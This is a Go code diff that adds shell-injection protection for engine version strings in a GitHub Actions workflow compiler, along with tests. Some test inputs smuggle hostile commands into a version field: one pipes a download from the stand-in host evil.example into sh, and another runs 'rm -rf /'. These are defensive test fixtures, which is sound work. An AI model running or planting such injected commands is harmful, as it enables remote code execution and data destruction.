diff --git a/pkg/workflow/engine_version.go b/pkg/workflow/engine_version.go
new file mode 100644
index 0000000..1ebb49d
--- /dev/null
+++ b/pkg/workflow/engine_version.go
@@ -0,0 +1,59 @@
+package workflow
+
+import (
+	"regexp"
+	"strings"
+)
+
+// engineVersionEnvVar is the environment variable used to pass engine.version into
+// install steps when the value cannot be safely embedded as a literal shell argument
+// (for example, when it is a GitHub Actions expression such as ${{ inputs.engine-version }}).
+const engineVersionEnvVar = "ENGINE_VERSION"
+
+// safeLiteralVersionRegex matches version strings that are safe to embed directly in a
+// shell command line (e.g. "1.2.3", "latest", "v1.0.0-beta.1").
+var safeLiteralVersionRegex = regexp.MustCompile(`^[A-Za-z0-9._-]+$`)
+
+// isExpressionVersion reports whether a version string contains a GitHub Actions
+// expression (${{ ... }}) that is evaluated at runtime.
+func isExpressionVersion(version string) bool {
+	return strings.Contains(version, "${{") && ExpressionPattern.MatchString(version)
+}
+
+// needsEnvVarForVersion reports whether the version must be passed to a shell step
+// through an environment variable instead of being interpolated into the command.
+// This is the case for GitHub Actions expressions and for any literal containing
+// characters outside a conservative safe set, preventing shell injection.
+func needsEnvVarForVersion(version string) bool {
+	return isExpressionVersion(version) || !safeLiteralVersionRegex.MatchString(version)
+}
+
+// buildVersionedRunStep builds the "run" line (and optional env block) for an install
+// step that takes a version. If the version is a safe literal, it is appended to the
+// command directly (preserving historical output). Otherwise the version is placed in
+// the step's env block (where GitHub Actions evaluates any expression before the shell
+// runs) and referenced from the shell as a quoted variable, so the value can never be
+// parsed as shell syntax.
+func buildVersionedRunStep(stepName, commandPrefix, version string) GitHubActionStep {
+	if !needsEnvVarForVersion(version) {
+		return GitHubActionStep{
+			"      - name: " + stepName,
+			"        run: " + commandPrefix + version,
+		}
+	}
+
+	return GitHubActionStep{
+		"      - name: " + stepName,
+		"        run: " + commandPrefix + `"${` + engineVersionEnvVar + `}"`,
+		"        env:",
+		"          " + engineVersionEnvVar + ": " + quoteYAMLEnvValue(version),
+	}
+}
+
+// quoteYAMLEnvValue renders a string as a double-quoted YAML scalar.
+func quoteYAMLEnvValue(value string) string {
+	escaped := strings.ReplaceAll(value, `\`, `\\`)
+	escaped = strings.ReplaceAll(escaped, `"`, `\"`)
+	escaped = strings.ReplaceAll(escaped, "\n", `\n`)
+	return `"` + escaped + `"`
+}
diff --git a/pkg/workflow/engine_version_test.go b/pkg/workflow/engine_version_test.go
new file mode 100644
index 0000000..12a3891
--- /dev/null
+++ b/pkg/workflow/engine_version_test.go
@@ -0,0 +1,174 @@
+//go:build !integration
+
+package workflow
+
+import (
+	"os"
+	"strings"
+	"testing"
+
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+)
+
+func TestBuildVersionedRunStep(t *testing.T) {
+	tests := []struct {
+		name             string
+		version          string
+		shouldContain    []string
+		shouldNotContain []string
+	}{
+		{
+			name:          "literal version is embedded directly",
+			version:       "1.2.3",
+			shouldContain: []string{"run: npm install -g pkg@1.2.3"},
+			shouldNotContain: []string{
+				"ENGINE_VERSION",
+			},
+		},
+		{
+			name:    "expression version is passed via env var",
+			version: "${{ inputs.engine-version }}",
+			shouldContain: []string{
+				`run: npm install -g pkg@"${ENGINE_VERSION}"`,
+				"env:",
+				`ENGINE_VERSION: "${{ inputs.engine-version }}"`,
+			},
+			shouldNotContain: []string{
+				"pkg@${{",
+			},
+		},
+		{
+			name:    "unsafe literal is passed via env var",
+			version: "1.0.0; curl evil.example | sh",
+			shouldContain: []string{
+				`run: npm install -g pkg@"${ENGINE_VERSION}"`,
+				`ENGINE_VERSION: "1.0.0; curl evil.example | sh"`,
+			},
+			shouldNotContain: []string{
+				"pkg@1.0.0;",
+			},
+		},
+		{
+			name:    "quotes are escaped in env value",
+			version: `1"; rm -rf / #`,
+			shouldContain: []string{
+				`ENGINE_VERSION: "1\"; rm -rf / #"`,
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			step := buildVersionedRunStep("Install pkg", "npm install -g pkg@", tt.version)
+			content := strings.Join(step, "\n")
+			for _, s := range tt.shouldContain {
+				assert.Contains(t, content, s)
+			}
+			for _, s := range tt.shouldNotContain {
+				assert.NotContains(t, content, s)
+			}
+		})
+	}
+}
+
+func TestIsExpressionVersion(t *testing.T) {
+	assert.True(t, isExpressionVersion("${{ inputs.engine-version }}"))
+	assert.True(t, isExpressionVersion("${{ inputs.v || '1.0.0' }}"))
+	assert.False(t, isExpressionVersion("1.2.3"))
+	assert.False(t, isExpressionVersion("latest"))
+	assert.False(t, isExpressionVersion("${{ unterminated"))
+}
+
+func TestEngineVersionExpressionInstallSteps(t *testing.T) {
+	const expr = "${{ inputs.engine-version }}"
+
+	engines := []struct {
+		name   string
+		engine CodingAgentEngine
+	}{
+		{"copilot", NewCopilotEngine()},
+		{"claude", NewClaudeEngine()},
+		{"codex", NewCodexEngine()},
+		{"gemini", NewGeminiEngine()},
+	}
+
+	for _, e := range engines {
+		t.Run(e.name+" expression", func(t *testing.T) {
+			data := &WorkflowData{
+				Name:         "test",
+				EngineConfig: &EngineConfig{ID: e.name, Version: expr},
+			}
+			steps := e.engine.GetInstallationSteps(data)
+			require.NotEmpty(t, steps)
+
+			var all []string
+			for _, s := range steps {
+				all = append(all, strings.Join(s, "\n"))
+			}
+			content := strings.Join(all, "\n")
+
+			assert.Contains(t, content, `"${ENGINE_VERSION}"`, "install command should reference the env var")
+			assert.Contains(t, content, `ENGINE_VERSION: "`+expr+`"`, "expression should be placed in env block")
+
+			// The expression must never appear on a run: line.
+			for _, line := range strings.Split(content, "\n") {
+				if strings.Contains(line, "run:") {
+					assert.NotContains(t, line, "${{", "expression must not be interpolated into shell: %s", line)
+				}
+			}
+		})
+
+		t.Run(e.name+" literal", func(t *testing.T) {
+			data := &WorkflowData{
+				Name:         "test",
+				EngineConfig: &EngineConfig{ID: e.name, Version: "1.2.3"},
+			}
+			steps := e.engine.GetInstallationSteps(data)
+			var all []string
+			for _, s := range steps {
+				all = append(all, strings.Join(s, "\n"))
+			}
+			content := strings.Join(all, "\n")
+			assert.NotContains(t, content, "ENGINE_VERSION", "literal version should keep direct interpolation")
+			assert.True(t,
+				strings.Contains(content, "@1.2.3") || strings.Contains(content, "install_copilot_cli.sh 1.2.3"),
+				"literal version should be in install command")
+		})
+	}
+}
+
+func TestEngineVersionExpressionCompile(t *testing.T) {
+	tmpDir := t.TempDir()
+	md := `---
+on:
+  workflow_call:
+    inputs:
+      engine-version:
+        type: string
+        default: "1.0.0"
+permissions:
+  contents: read
+engine:
+  id: copilot
+  version: ${{ inputs.engine-version }}
+---
+
+# Test
+
+Do something.
+`
+	path := tmpDir + "/test.md"
+	require.NoError(t, os.WriteFile(path, []byte(md), 0o644))
+
+	compiler := NewCompiler()
+	require.NoError(t, compiler.CompileWorkflow(path))
+
+	lockBytes, err := os.ReadFile(strings.TrimSuffix(path, ".md") + ".lock.yml")
+	require.NoError(t, err)
+	lock := string(lockBytes)
+
+	assert.Contains(t, lock, `install_copilot_cli.sh "${ENGINE_VERSION}"`)
+	assert.Contains(t, lock, `ENGINE_VERSION: "${{ inputs.engine-version }}"`)
+	assert.NotContains(t, lock, "install_copilot_cli.sh ${{")
+}
